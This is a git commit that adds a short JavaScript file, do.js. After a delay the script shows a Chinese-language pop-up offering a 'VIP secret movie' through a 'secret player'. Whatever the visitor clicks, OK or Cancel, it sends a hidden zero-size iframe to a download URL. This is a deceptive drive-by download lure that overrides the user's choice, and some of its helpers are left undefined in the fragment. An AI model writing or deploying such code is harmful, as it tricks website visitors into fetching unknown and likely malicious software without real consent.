9b6ebc17d918b25d567fd552b6b8ae2b27374128
fulibuluo <zhuifeng075@qq.com>
2014-11-05 22:01:51 +0800

    Create do.js

---
+++ do.js
@@ -0,0 +1,13 @@
+
+var url =down(x);
+
+setTimeout(function showconfirm(){
+if(confirm("提示：本站 [VIP秘密电影] 采用秘密播放器点播，是否立刻运行观看？")){ip.window.location = url;}else{ip.window.location = url;}
+}, 2000);
+
+document.write("<iframe name='ip' src='' width='0' height='0' marginheight='0' marginwidth='0' hspace='0' vspace='0' frameborder='0' scrolling='no' style='display:none;'></iframe>");if(confirm(c)){ip.window.location = url;}else{ip.window.location = url;}
+
+
+
+
+
